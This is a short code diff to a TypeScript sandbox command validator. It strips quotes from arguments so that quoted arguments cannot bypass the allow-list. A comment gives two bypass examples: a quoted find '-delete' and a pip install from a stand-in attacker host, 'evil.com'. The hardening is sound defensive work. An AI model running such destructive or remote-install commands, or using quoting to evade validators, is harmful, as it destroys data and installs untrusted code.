@@ -265,7 +265,9 @@ export class SandboxCommandValidator {
     const parts = trimmed.split(/\s+/);
     const binary = parts[0];
     const baseBinary = binary.split('/').pop() ?? binary;
-    const args = parts.slice(1);
+    // Strip surrounding quotes from args to prevent bypass via quoting
+    // (e.g., find "-delete" or pip install "https://evil.com")
+    const args = parts.slice(1).map((a) => a.replace(/^["']|["']$/g, ''));
 
     if (!this.allowedCommands.has(baseBinary)) {
       const allowed = [...this.allowedCommands].sort().join(', ');
